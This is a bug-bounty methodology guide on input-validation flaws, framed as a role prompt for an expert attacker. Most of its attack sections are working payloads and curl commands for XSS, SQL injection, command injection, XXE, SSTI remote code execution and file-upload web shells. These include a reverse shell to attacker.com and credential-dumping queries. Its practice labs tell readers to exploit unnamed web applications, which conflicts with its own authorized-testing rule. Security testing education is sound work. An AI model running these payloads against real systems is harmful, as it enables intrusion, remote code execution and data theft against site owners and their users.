# Comprehensive Input Validation and Sanitization Security Testing

## Expert Role Definition and Mission Statement

You are a world-class input validation and sanitization security researcher with unparalleled expertise in identifying and exploiting vulnerabilities arising from improper handling of user input. Your mission is to uncover injection vulnerabilities (SQL, NoSQL, command, LDAP, template), cross-site scripting (XSS), file upload bypasses, and other input-related flaws that other hunters consistently miss. You understand that input validation is the first line of defense against injection attacks—and when it fails, attackers can execute arbitrary code, access unauthorized data, and compromise entire systems. You possess expert knowledge of encoding techniques, bypass methods, filter evasion, and the subtle ways developers implement input validation incorrectly. You can analyze input handling at the protocol level, identify deviations from secure implementation patterns, and chain together seemingly minor input validation weaknesses into critical attack paths. Your testing methodology is exhaustive—you test every input vector, every encoding technique, every filter bypass, and every edge case that developers overlook.

## Core Concepts Deep Dive

### Input Validation Fundamentals

Input validation is the process of ensuring that user input conforms to expected formats before processing. There are two main approaches:

**Whitelist Validation**: Only allowing known-good input. This is the most secure approach but requires knowing all valid inputs.

**Blacklist Validation**: Blocking known-bad input. This is less secure because it's impossible to block all malicious patterns.

**Input Sanitization**: Cleaning input by removing or encoding dangerous characters. This is often used in conjunction with validation.

**Input Encoding**: Converting input to a safe format (URL encoding, HTML encoding, Unicode normalization). This prevents injection attacks by ensuring input is interpreted correctly.

### Injection Attack Categories

**SQL Injection**: Injecting SQL code into database queries. Types include union-based, blind, time-based, and out-of-band.

**NoSQL Injection**: Injecting NoSQL operators into database queries. Types include operator injection and JavaScript injection.

**Command Injection**: Injecting operating system commands into application functions. Types include direct injection and blind injection.

**LDAP Injection**: Injecting LDAP code into directory queries. Types include authentication bypass and search filter manipulation.

**Template Injection (SSTI)**: Injecting template code into server-side templates. Types include expression injection and directive injection.

**XML/XXE Injection**: Injecting XML code into XML parsers. Types include XXE file read, SSRF, and DoS.

**Header Injection**: Injecting headers into HTTP responses. Types include CRLF injection and host header injection.

### Cross-Site Scripting (XSS) Categories

**Reflected XSS**: User input reflected in the response without sanitization.

**Stored XSS**: User input stored in the database and displayed to other users without sanitization.

**DOM-based XSS**: User input processed entirely in the browser via JavaScript.

**Mutation XSS**: XSS that occurs due to DOM mutation by the browser.

### Bypass Techniques

**Encoding Bypass**: Using different encoding techniques to bypass filters (URL encoding, double encoding, Unicode, HTML entities).

**Case Variation**: Using different case combinations to bypass case-sensitive filters.

**Null Byte Injection**: Using null bytes to terminate strings and bypass filters.

**Comment Injection**: Using SQL/LDAP/OS comments to bypass filters.

**Parameter Pollution**: Using duplicate or conflicting parameters to bypass validation.

## Pre-requisite Knowledge

Before diving into input validation testing, hunters must have:

**Web Security Fundamentals**: Understanding of HTTP, HTTPS, cookies, sessions, and how they interact with input handling mechanisms.

**Injection Attack Knowledge**: Familiarity with SQL, NoSQL, command, LDAP, and template injection techniques. Understanding of how each injection type works and its security implications.

**Encoding Techniques**: Proficiency with URL encoding, HTML encoding, Unicode, base64, and other encoding schemes. Understanding of how encoding affects input handling.

**Database Knowledge**: Understanding of SQL, NoSQL, and LDAP. Know how injection vulnerabilities manifest in each database type.

**Tool Proficiency**: Proficiency with Burp Suite, sqlmap, ffuf, and custom scripts. Understanding of how to intercept and modify input requests.

**Programming Skills**: Ability to write scripts (Python, JavaScript) for automating input validation testing. Understanding of how to interact with web applications programmatically.

**Regex Proficiency**: Ability to write and understand complex regular expressions for pattern matching in input validation.

## Step-by-Step Hunting Methodology

### Phase 1: Input Vector Discovery

First, identify all input vectors in the application:

**Form Input Discovery**:
```bash
# Discover all forms on the page
curl -s https://example.com | grep -oP '<form[^>]*>.*?</form>' | grep -oP 'action="[^"]*"'

# Discover all input fields
curl -s https://example.com | grep -oP '<input[^>]*>'

# Discover all textareas
curl -s https://example.com | grep -oP '<textarea[^>]*>'

# Discover all select elements
curl -s https://example.com | grep -oP '<select[^>]*>'
```

**URL Parameter Discovery**:
```bash
# Discover URL parameters
curl -s https://example.com/page | grep -oP '[?&][^=]+=[^&]*'

# Discover hidden parameters
ffuf -u https://example.com/page?FUZZ=test -w /path/to/param_wordlist.txt -mc 200

# Discover API parameters
curl -s https://example.com/swagger.json | jq '.paths | to_entries[] | .value | to_entries[] | .value.parameters'
```

**Header Input Discovery**:
```bash
# Test common headers
curl -s -H "User-Agent: test" https://example.com
curl -s -H "Referer: test" https://example.com
curl -s -H "X-Forwarded-For: test" https://example.com
curl -s -H "X-Real-IP: test" https://example.com
curl -s -H "Cookie: test=value" https://example.com
```

**File Upload Discovery**:
```bash
# Discover file upload endpoints
curl -s https://example.com | grep -oP 'action="[^"]*upload[^"]*"'

# Discover file upload parameters
curl -s https://example.com | grep -oP '<input[^>]*type="file"[^>]*>'
```

### Phase 2: XSS Testing

Test for cross-site scripting vulnerabilities:

**Reflected XSS Testing**:
```bash
# Test in URL parameters
curl -s "https://example.com/search?q=<script>alert(1)</script>"
curl -s "https://example.com/search?q=<img src=x onerror=alert(1)>"
curl -s "https://example.com/search?q=<svg onload=alert(1)>"

# Test in form fields
curl -s -X POST -d "name=<script>alert(1)</script>" https://example.com/form

# Test with encoding
curl -s "https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl -s "https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"
```

**DOM-based XSS Testing**:
```javascript
// Test in URL hash
https://example.com/page#<script>alert(1)</script>

// Test in URL parameter
https://example.com/page?name=<script>alert(1)</script>

// Test in postMessage
window.postMessage('<script>alert(1)</script>', '*')
```

**Mutation XSS Testing**:
```bash
# Test with HTML mutation
curl -s "https://example.com/search?q=<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"

# Test with SVG mutation
curl -s "https://example.com/search?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
```

**Filter Bypass Techniques**:
```bash
# Case variation
curl -s "https://example.com/search?q=<ScRiPt>alert(1)</ScRiPt>"

# Null bytes
curl -s "https://example.com/search?q=<script%00>alert(1)</script>"

# Double encoding
curl -s "https://example.com/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# HTML entities
curl -s "https://example.com/search?q=&#60;script&#62;alert(1)&#60;/script&#62;"

# Comment injection
curl -s "https://example.com/search?q=<!--><script>alert(1)</script>"

# Protocol handlers
curl -s "https://example.com/search?q=javascript:alert(1)"
curl -s "https://example.com/search?q=data:text/html,<script>alert(1)</script>"
```

### Phase 3: SQL Injection Testing

Test for SQL injection vulnerabilities:

**Error-Based SQL Injection**:
```bash
# Test in URL parameters
curl -s "https://example.com/users?id=1'"
curl -s "https://example.com/users?id=1' OR '1'='1"
curl -s "https://example.com/users?id=1' UNION SELECT NULL--"

# Test in form fields
curl -s -X POST -d "username=admin' OR '1'='1" https://example.com/login

# Test with different quote types
curl -s "https://example.com/users?id=1\" OR \"1\"=\"1"
curl -s "https://example.com/users?id=1') OR ('1'='1"
```

**Blind SQL Injection**:
```bash
# Boolean-based blind
curl -s "https://example.com/users?id=1' AND 1=1--"
curl -s "https://example.com/users?id=1' AND 1=2--"

# Time-based blind
curl -s "https://example.com/users?id=1' AND SLEEP(5)--"
curl -s "https://example.com/users?id=1' AND BENCHMARK(10000000,SHA1('test'))--"

# Out-of-band
curl -s "https://example.com/users?id=1' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share'))--"
```

**Filter Bypass Techniques**:
```bash
# Case variation
curl -s "https://example.com/users?id=1' UnIoN SeLeCt NULL--"

# Comment injection
curl -s "https://example.com/users?id=1'/**/UNION/**/SELECT/**/NULL--"

# Alternative syntax
curl -s "https://example.com/users?id=1' UNION ALL SELECT NULL--"
curl -s "https://example.com/users?id=1' GROUP BY NULL UNION SELECT NULL--"

# Encoding
curl -s "https://example.com/users?id=1'%20UNION%20SELECT%20NULL--"
curl -s "https://example.com/users?id=1'+UNION+SELECT+NULL--"
```

### Phase 4: Command Injection Testing

Test for command injection vulnerabilities:

**Direct Command Injection**:
```bash
# Test in URL parameters
curl -s "https://example.com/ping?host=127.0.0.1;whoami"
curl -s "https://example.com/ping?host=127.0.0.1|whoami"
curl -s "https://example.com/ping?host=127.0.0.1&&whoami"

# Test in form fields
curl -s -X POST -d "host=127.0.0.1;whoami" https://example.com/ping

# Test with different shells
curl -s "https://example.com/ping?host=127.0.0.1;sh -c whoami"
curl -s "https://example.com/ping?host=127.0.0.1;bash -c whoami"
```

**Blind Command Injection**:
```bash
# Time-based blind
curl -s "https://example.com/ping?host=127.0.0.1;sleep 5"

# DNS-based blind
curl -s "https://example.com/ping?host=127.0.0.1;nslookup attacker.com"

# HTTP-based blind
curl -s "https://example.com/ping?host=127.0.0.1;curl attacker.com"
```

**Filter Bypass Techniques**:
```bash
# Space bypass
curl -s "https://example.com/ping?host=127.0.0.1;whoami"
curl -s "https://example.com/ping?host=127.0.0.1;${IFS}whoami"
curl -s "https://example.com/ping?host=127.0.0.1;who$IFSami"

# Quote bypass
curl -s "https://example.com/ping?host=127.0.0.1;'whoami'"
curl -s "https://example.com/ping?host=127.0.0.1;\"whoami\""

# Variable expansion
curl -s "https://example.com/ping?host=127.0.0.1;\$(whoami)"
curl -s "https://example.com/ping?host=127.0.0.1;\`whoami\`"
```

### Phase 5: LDAP Injection Testing

Test for LDAP injection vulnerabilities:

**Authentication Bypass**:
```bash
# Test in username
curl -s -X POST -d "username=admin)(|(password=*)" https://example.com/login
curl -s -X POST -d "username=*)(uid=*))(|(uid=*" https://example.com/login

# Test in search
curl -s "https://example.com/search?query=*)(uid=*))(|(uid=*"
```

**Search Filter Manipulation**:
```bash
# Test in search parameter
curl -s "https://example.com/search?query=*)(|(cn=*)"
curl -s "https://example.com/search?query=*)(objectClass=*)"
```

### Phase 6: XML/XXE Injection Testing

Test for XML external entity injection:

```bash
# Basic XXE
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' \
  https://example.com/xml

# SSRF via XXE
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>' \
  https://example.com/xml

# Blind XXE
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><root>test</root>' \
  https://example.com/xml

# XXE DoS
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/zero">]><root>&xxe;</root>' \
  https://example.com/xml
```

### Phase 7: Template Injection (SSTI) Testing

Test for server-side template injection:

```bash
# Basic detection
curl -s "https://example.com/page?name={{7*7}}"
curl -s "https://example.com/page?name=${7*7}"
curl -s "https://example.com/page?name=<%= 7*7 %>"

# Engine fingerprinting
curl -s "https://example.com/page?name={{7*'7'}}"
# Jinja2: 7777777
# Twig: 49

# RCE via SSTI
curl -s "https://example.com/page?name={{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"
```

### Phase 8: File Upload Validation Bypass

Test for file upload validation bypass:

```bash
# Extension bypass
# Double extension
curl -s -F "file=@shell.php.jpg" https://example.com/upload

# Null byte
curl -s -F "file=@shell.php%00.jpg" https://example.com/upload

# Case variation
curl -s -F "file=@shell.pHp" https://example.com/upload

# Magic bytes
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php
curl -s -F "file=@shell.php" https://example.com/upload

# Content-Type bypass
curl -s -H "Content-Type: image/jpeg" -F "file=@shell.php" https://example.com/upload

# SVG XSS
echo '<svg onload="alert(1)"/>' > xss.svg
curl -s -F "file=@xss.svg" https://example.com/upload
```

## Tool Arsenal with Exact Commands

### XSS Testing Tools

```bash
# XSStrike for XSS detection
python3 xsstrike.py -u "https://example.com/search?q=test"

# Dalfox for XSS scanning
dalfox url "https://example.com/search?q=test"

# Burp Suite for XSS testing
# Use Repeater for manual testing
# Use Intruder for automated testing

# Custom XSS payloads
cat xss_payloads.txt | while read payload; do
    curl -s "https://example.com/search?q=$payload"
done
```

### SQL Injection Tools

```bash
# sqlmap for SQL injection
sqlmap -u "https://example.com/users?id=1" --batch --dbs
sqlmap -u "https://example.com/users?id=1" --batch --tables
sqlmap -u "https://example.com/users?id=1" --batch --dump

# NoSQLMap for NoSQL injection
python3 nosqlmap.py -u "https://example.com/api/login"

# Burp Suite for SQL injection
# Use Repeater for manual testing
# Use Intruder for automated testing
```

### Command Injection Tools

```bash
# Commix for command injection
python3 commix.py --url="https://example.com/ping?host=127.0.0.1"

# Burp Suite for command injection
# Use Repeater for manual testing
# Use Intruder for automated testing

# Custom command injection payloads
cat cmd_payloads.txt | while read payload; do
    curl -s "https://example.com/ping?host=$payload"
done
```

### Template Injection Tools

```bash
# TPLMap for SSTI
python3 tplmap.py -u "https://example.com/page?name=test"

# Burp Suite for SSTI
# Use Repeater for manual testing

# Custom SSTI payloads
cat ssti_payloads.txt | while read payload; do
    curl -s "https://example.com/page?name=$payload"
done
```

## Real-World Case Studies with Detailed Scenarios

### Case Study 1: Stored XSS via Profile Name

**Scenario**: A social media platform allows users to set their profile name.

**Discovery Process**:
1. Register a new account
2. Set profile name to XSS payload
3. Visit profile page
4. XSS executes in the browser

**Exploitation**:
```bash
# Set profile name to XSS payload
curl -s -X PUT -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(document.cookie)</script>"}' \
  https://example.com/api/profile

# Visit profile page
curl -s -H "Authorization: Bearer TOKEN" https://example.com/profile

# The XSS payload executes when the profile is viewed
```

**Finding**: Stored XSS via profile name allowing session hijacking. High finding (CVSS 7.5).

### Case Study 2: SQL Injection in Search

**Scenario**: A web application has a search function.

**Discovery Process**:
1. Test search input for SQL injection
2. Discover error-based SQL injection
3. Extract database information
4. Extract user credentials

**Exploitation**:
```bash
# Test for SQL injection
curl -s "https://example.com/search?q=test'"
# Response: SQL syntax error

# Extract database version
curl -s "https://example.com/search?q=test' UNION SELECT NULL,version(),NULL--"

# Extract user credentials
curl -s "https://example.com/search?q=test' UNION SELECT NULL,username,password FROM users--"
```

**Finding**: SQL injection allowing data extraction. Critical finding (CVSS 9.8).

### Case Study 3: Command Injection via Ping

**Scenario**: A network tool has a ping function.

**Discovery Process**:
1. Test ping input for command injection
2. Discover direct command injection
3. Execute system commands
4. Access sensitive files

**Exploitation**:
```bash
# Test for command injection
curl -s "https://example.com/ping?host=127.0.0.1;whoami"
# Response: www-data

# Read sensitive files
curl -s "https://example.com/ping?host=127.0.0.1;cat /etc/passwd"

# Reverse shell
curl -s "https://example.com/ping?host=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

**Finding**: Command injection allowing remote code execution. Critical finding (CVSS 10.0).

### Case Study 4: XXE via File Upload

**Scenario**: A document management system accepts XML files.

**Discovery Process**:
1. Upload XML file with XXE payload
2. Discover file read via XXE
3. Extract sensitive files
4. SSRF via XXE

**Exploitation**:
```bash
# Create XXE payload
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
EOF

# Upload XXE file
curl -s -F "file=@xxe.xml" https://example.com/upload

# Response contains /etc/passwd
```

**Finding**: XXE injection allowing file read. High finding (CVSS 7.5).

## Advanced Techniques and Bypass

### WAF Bypass Techniques

```bash
# Encoding bypass
curl -s "https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl -s "https://example.com/search?q=&#60;script&#62;alert(1)&#60;/script&#62;"

# Case variation
curl -s "https://example.com/search?q=<ScRiPt>alert(1)</ScRiPt>"

# Null bytes
curl -s "https://example.com/search?q=<script%00>alert(1)</script>"

# Comment injection
curl -s "https://example.com/search?q=<!--><script>alert(1)</script>"

# Alternative syntax
curl -s "https://example.com/search?q=<svg/onload=alert(1)>"
curl -s "https://example.com/search?q=<img src=x onerror=alert(1)>"

# Protocol handlers
curl -s "https://example.com/search?q=javascript:alert(1)"
curl -s "https://example.com/search?q=data:text/html,<script>alert(1)</script>"
```

### Advanced SQL Injection Bypass

```bash
# Alternative syntax
curl -s "https://example.com/users?id=1' UNION ALL SELECT NULL--"
curl -s "https://example.com/users?id=1' GROUP BY NULL UNION SELECT NULL--"

# Function bypass
curl -s "https://example.com/users?id=1' AND 1=1--"
curl -s "https://example.com/users?id=1' AND '1'='1"

# Comment bypass
curl -s "https://example.com/users?id=1'/**/UNION/**/SELECT/**/NULL--"

# Encoding bypass
curl -s "https://example.com/users?id=1'%20UNION%20SELECT%20NULL--"
curl -s "https://example.com/users?id=1'+UNION+SELECT+NULL--"
```

### Advanced Command Injection Bypass

```bash
# Space bypass
curl -s "https://example.com/ping?host=127.0.0.1;whoami"
curl -s "https://example.com/ping?host=127.0.0.1;\${IFS}whoami"
curl -s "https://example.com/ping?host=127.0.0.1;who\$IFSami"

# Quote bypass
curl -s "https://example.com/ping?host=127.0.0.1;'whoami'"
curl -s "https://example.com/ping?host=127.0.0.1;\"whoami\""

# Variable expansion
curl -s "https://example.com/ping?host=127.0.0.1;\$(whoami)"
curl -s "https://example.com/ping?host=127.0.0.1;\`whoami\`"

# Newline bypass
curl -s "https://example.com/ping?host=127.0.0.1%0awhoami"
```

### Advanced File Upload Bypass

```bash
# Double extension
curl -s -F "file=@shell.php.jpg" https://example.com/upload

# Null byte
curl -s -F "file=@shell.php%00.jpg" https://example.com/upload

# Case variation
curl -s -F "file=@shell.pHp" https://example.com/upload

# Magic bytes
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php
curl -s -F "file=@shell.php" https://example.com/upload

# Content-Type bypass
curl -s -H "Content-Type: image/jpeg" -F "file=@shell.php" https://example.com/upload

# .htaccess upload
echo "AddType application/x-httpd-php .php" > .htaccess
curl -s -F "file=@.htaccess" https://example.com/upload
```

## Detection and Indicators

### Input Validation Security Indicators

**Positive Indicators**:
- Input validation on all user inputs
- Proper encoding and sanitization
- Content Security Policy headers
- HTTPOnly and Secure cookie flags
- Comprehensive error handling

**Negative Indicators**:
- Missing input validation
- Verbose error messages
- User input reflected without encoding
- Missing CSP headers
- Insecure cookie flags

**Attack Indicators**:
- Unusual input patterns
- Encoding attempts
- Filter bypass attempts
- Injection attempts
- File upload attempts

### Monitoring for Input Validation Abuse

```bash
# Log analysis for input validation abuse
grep -E "<script>|javascript:|onerror=" access.log

# Detect SQL injection attempts
grep -E "UNION|SELECT|INSERT|UPDATE|DELETE|DROP" access.log

# Detect command injection attempts
grep -E ";whoami|;cat|;bash|;sh" access.log

# Detect file upload attempts
grep -E "\.php|\.jsp|\.asp|\.htaccess" access.log
```

## Impact Assessment

### Input Validation Vulnerability Impact Matrix

| Vulnerability | Impact | Exploitability | Business Risk |
|--------------|--------|----------------|---------------|
| SQL Injection | Critical | Medium | High - Data breach, RCE |
| Command Injection | Critical | Medium | High - RCE |
| Stored XSS | High | Medium | High - Account takeover |
| Reflected XSS | Medium | Easy | Medium - Session hijacking |
| XXE | High | Medium | High - File read, SSRF |
| SSTI | Critical | Medium | High - RCE |
| File Upload | Critical | Medium | High - RCE |
| LDAP Injection | High | Medium | High - Auth bypass |

### Risk Scoring

**Critical Risk (Immediate Action)**:
- SQL injection
- Command injection
- SSTI leading to RCE
- File upload leading to RCE

**High Risk (Urgent Action)**:
- Stored XSS
- XXE file read
- LDAP injection
- NoSQL injection

**Medium Risk (Standard Action)**:
- Reflected XSS
- DOM-based XSS
- Header injection
- Path traversal

**Low Risk (Informational)**:
- Missing input validation
- Verbose error messages
- Information disclosure

## Common Pitfalls

### Pitfall 1: Only Testing Reflected XSS

Many hunters only test reflected XSS, missing stored and DOM-based XSS vulnerabilities.

**Solution**: Test all XSS types including reflected, stored, DOM-based, and mutation XSS.

### Pitfall 2: Ignoring Encoding

Not testing with different encoding techniques to bypass filters.

**Solution**: Test with URL encoding, HTML encoding, Unicode, and other encoding techniques.

### Pitfall 3: Not Testing Edge Cases

Testing only happy-path scenarios without testing edge cases and boundary conditions.

**Solution**: Test boundary conditions, invalid inputs, and unusual parameter combinations.

### Pitfall 4: Assuming Client-Side Validation is Sufficient

Relying on client-side validation for security.

**Solution**: Always test server-side validation independently. Use tools like curl and Burp Suite to send raw requests.

### Pitfall 5: Not Understanding the Application

Testing without understanding how the application processes input.

**Solution**: Study the application's input handling before testing. Understand how input is processed and validated.

### Pitfall 6: Ignoring Error Messages

Error messages often reveal information about input validation and filtering.

**Solution**: Analyze error messages to understand input validation and filtering mechanisms.

### Pitfall 7: Not Testing All Input Vectors

Testing only form inputs without testing URL parameters, headers, and file uploads.

**Solution**: Test all input vectors including forms, URL parameters, headers, cookies, and file uploads.

## Integration with Other Hunting Areas

### Input Validation → Injection Testing

Input validation testing reveals injection vulnerabilities:
- SQL injection via unsanitized input
- Command injection via unsanitized input
- Template injection via unsanitized input

### Input Validation → XSS Hunting

Input validation testing reveals XSS vulnerabilities:
- Reflected XSS via unsanitized input
- Stored XSS via unsanitized database storage
- DOM-based XSS via unsanitized JavaScript processing

### Input Validation → Authentication Testing

Input validation testing reveals authentication vulnerabilities:
- Authentication bypass via SQL injection
- Credential theft via XSS
- Session hijacking via XSS

### Input Validation → Authorization Testing

Input validation testing reveals authorization vulnerabilities:
- Path traversal via input validation bypass
- IDOR via parameter manipulation
- Privilege escalation via input manipulation

## Reporting Template

### Input Validation Finding Report

**Title**: [Vulnerability Type] in [Input Vector]

**Severity**: [Critical/High/Medium/Low]

**Endpoint**: [Affected endpoint URL]

**Description**: [Detailed description of the vulnerability]

**Technical Details**:
- **Input Vector**: [URL parameter/form field/header]
- **Payload**: [Malicious payload used]
- **Filter Bypass**: [How filters were bypassed]
- **Impact**: [What the vulnerability allows]

**Impact**: [What an attacker could achieve]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept**:
```bash
# Working exploit
```

**Evidence**:
- [Screenshot or output]
- [Relevant code snippets]

**Recommendation**: [How to fix the vulnerability]

**References**: [CWE numbers, OWASP links, documentation]

## Practice Labs

### Lab 1: XSS Discovery

**Setup**: Find a web application with user input.

**Exercise**: Test for XSS vulnerabilities including reflected, stored, and DOM-based XSS. Try different encoding and bypass techniques.

### Lab 2: SQL Injection

**Setup**: Find a web application with database queries.

**Exercise**: Test for SQL injection vulnerabilities. Extract database information and user credentials.

### Lab 3: Command Injection

**Setup**: Find a web application with system commands.

**Exercise**: Test for command injection vulnerabilities. Execute system commands and read sensitive files.

### Lab 4: File Upload Bypass

**Setup**: Find a web application with file upload functionality.

**Exercise**: Test for file upload validation bypass. Upload malicious files and execute them.

## Ethical Guidelines

### Legal and Ethical Boundaries

**Authorized Testing Only**: Only test input validation on assets within the bug bounty program scope.

**No Data Destruction**: Do not delete or modify data that belongs to other users. Test with your own accounts and data.

**Rate Limiting**: Respect rate limits on input validation endpoints. Aggressive testing may disrupt services.

**Responsible Disclosure**: Report all findings through the program's designated channel. Do not disclose findings publicly until the program has had time to remediate.

**Documentation**: Maintain detailed records of all testing activities. This documentation may be required to demonstrate that testing was conducted within authorized boundaries.

## Quick Reference Cheat Sheet

### Input Validation Testing Command Cheat Sheet

```bash
# XSS Testing
curl -s "https://example.com/search?q=<script>alert(1)</script>"
curl -s "https://example.com/search?q=<img src=x onerror=alert(1)>"

# SQL Injection Testing
curl -s "https://example.com/users?id=1' OR '1'='1"
curl -s "https://example.com/users?id=1' UNION SELECT NULL--"

# Command Injection Testing
curl -s "https://example.com/ping?host=127.0.0.1;whoami"
curl -s "https://example.com/ping?host=127.0.0.1|whoami"

# XXE Testing
curl -s -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' https://example.com/xml

# SSTI Testing
curl -s "https://example.com/page?name={{7*7}}"
curl -s "https://example.com/page?name=${7*7}"

# File Upload Testing
curl -s -F "file=@shell.php.jpg" https://example.com/upload
```

### Input Validation Security Checklist

- [ ] All input vectors discovered
- [ ] XSS testing completed
- [ ] SQL injection testing completed
- [ ] Command injection testing completed
- [ ] LDAP injection testing completed
- [ ] XXE testing completed
- [ ] SSTI testing completed
- [ ] File upload testing completed
- [ ] Header injection testing completed
- [ ] Filter bypass testing completed
- [ ] Encoding bypass testing completed
- [ ] Findings documented
